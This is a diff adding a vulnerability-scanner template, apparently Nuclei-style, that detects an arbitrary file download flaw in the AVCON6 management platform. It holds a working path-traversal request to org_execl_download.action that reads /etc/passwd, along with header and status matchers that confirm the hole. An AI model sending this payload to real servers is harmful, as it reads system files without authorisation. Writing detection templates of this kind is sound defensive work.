@@ -1,0 +1,24 @@
+id: avcon6-execl-lfi
+brief:
+    title: AVCON6 org_execl_download.action - Arbitrary File Download
+    by: DhiyaneshDk
+    level: high
+    about: Arbitrary File Download vulnerability in the org_execl_download.action of the AVCON6 system management platform, through which an attacker can download arbitrary files from the server
+    label:
+        - avcon6
+        - lfi
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/org_execl_download.action?filename=../../../../../../../../../../../../../etc/passwd'
+      signs:
+        - "on": word
+          has:
+            - application/octet-stream
+            - filename=
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
